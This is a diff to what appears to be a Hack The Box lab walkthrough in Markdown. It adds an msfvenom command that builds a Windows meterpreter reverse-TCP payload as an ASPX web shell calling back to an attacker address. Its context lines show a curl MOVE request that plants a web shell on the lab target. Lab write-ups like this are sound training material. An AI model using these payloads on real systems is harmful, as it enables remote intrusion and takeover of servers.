@@ -256,3 +256,11 @@ curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/r
 
 ### Access Web Shell
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9f945906-a62a-457b-b743-641e12ce5ae8)
+
+---
+
+## MSF Venom
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > shell.aspx     
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3d625576-c3ee-4c8d-8ae9-44895439a223)
